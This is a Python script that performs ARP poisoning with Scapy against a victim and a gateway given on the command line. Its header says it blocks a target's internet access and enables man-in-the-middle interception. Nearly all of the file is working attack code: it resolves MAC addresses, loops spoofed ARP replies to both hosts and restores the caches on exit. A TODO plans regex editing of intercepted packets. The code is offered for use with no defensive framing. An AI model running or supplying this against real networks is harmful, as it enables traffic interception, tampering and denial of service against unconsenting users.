'''
Arp Poisoning in Python 3

> acts as an effective internet blocker(DOS) without ip forwarding enabled 
> can be used as a means of man in the middle attacks 

!!!TODO:!!!
> Add packet filtering functionality to edit packet strings with regex
> Test as compiled binary on Mac, Linux, and Windows

enjoy
'''

import os
import signal
import sys
import time

from scapy.all import *

import config as cfg

# Edit config.py to set interface
interface = cfg.interface

def get_mac(ip):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1, verbose=0)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac):
    print("\n[*] Starting Arp Poison...")
    while True:
        try:
            # scapy arp poison
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip), verbose=0)
            send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip), verbose=0)
            time.sleep(5)
        except KeyboardInterrupt:
            # clean exit when keyboard interrupt is sent
            print("\n[*] Stopping Arp Poison...")
            re_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)

def re_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
    print("\n[*] Restoring Targets...")
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_mac), count = 7)
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
    sys.exit(1)

def clean_exit(sig, frame):
    print('You pressed Ctrl+C!')
    
if __name__ == '__main__':
    victim_ip = sys.argv[1]
    victim_mac = get_mac(victim_ip)
    gateway_ip = sys.argv[2]
    gateway_mac = get_mac(gateway_ip)

    print("victim mac:", victim_mac)
    print("gateway mac:", gateway_mac)

    arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac)


